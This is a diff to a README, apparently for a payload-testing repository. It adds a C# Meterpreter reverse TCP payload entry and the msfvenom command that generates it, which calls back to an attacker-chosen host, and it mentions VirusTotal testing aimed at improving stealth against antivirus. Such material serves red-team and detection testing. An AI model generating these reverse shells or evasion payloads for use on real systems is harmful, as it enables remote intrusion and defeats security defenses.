@@ -138,6 +138,21 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port
 
 ---
 
+### `Payload.cs`
+- **Description**: A reverse TCP payload in C# format used in Basic and Avanced Shellcode runners, designed for testing AV and EDR detection.
+- **Architecture**: 64-bit Windows
+- **Type**: C# Payload (`.cs`)
+
+---
+
+## Generation Command
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> EXITFUNC=thread -f csharp -o Payload.cs
+```
+
+---
+
 ## Detection Analysis
 
 The payloads were uploaded to VirusTotal to evaluate detection rates across various antivirus engines. The results serve as a baseline to identify opportunities for improving stealth through encoding, obfuscation, and other evasion techniques.
